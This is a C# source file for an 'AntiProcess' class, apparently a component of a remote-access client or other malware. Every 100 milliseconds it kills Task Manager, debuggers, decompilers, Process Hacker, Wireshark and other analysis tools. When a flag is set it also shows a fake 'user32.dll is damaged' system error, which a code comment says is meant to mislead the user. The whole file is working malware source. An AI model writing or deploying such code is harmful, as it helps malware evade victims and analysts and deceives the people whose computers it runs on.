using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    internal class AntiProcess
    {
        private string[] proc_sand =
        {
            "taskmgr",
            "dnspy",
            "reflector",
            "ilspy",
            "codereflect",
            "processhacker",
            "sandbox control",
            "netsniffercs",
            "exeinfope",
            "ipblocker",
            "wireshark",
            "ida64.exe",
            "ida32.exe",
            "apatedns",
            "spythespy",
            "procexp",
        };
        private string[] proc_browser =
        {
            "chrome",
            "medge",
            "mozilla",
        };

        public bool fake_msg = false;
        public bool anti_stop = false;

        public void Start()
        {
            anti_stop = false;
            while (!anti_stop)
            {
                foreach (string proc in proc_sand)
                {
                    int success_cnt = 0;
                    string main_name = string.Empty;
                    foreach (Process p in Process.GetProcessesByName(proc))
                    {
                        try
                        {
                            p.Kill();
                            main_name = p.ProcessName;
                            success_cnt++;
                        }
                        catch (Exception ex)
                        {

                        }
                    }
                    if (fake_msg && success_cnt > 0)
                    {
                        //FAKE MESSAGE BOX TO MISLEAD USER.
                        MessageBox.Show($"Cannot open {main_name}, user32.dll is damaged.", "System Error(0x0012654)", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                Thread.Sleep(100);
            }
        }

        public void Stop()
        {
            anti_stop = true;
        }
    }
}
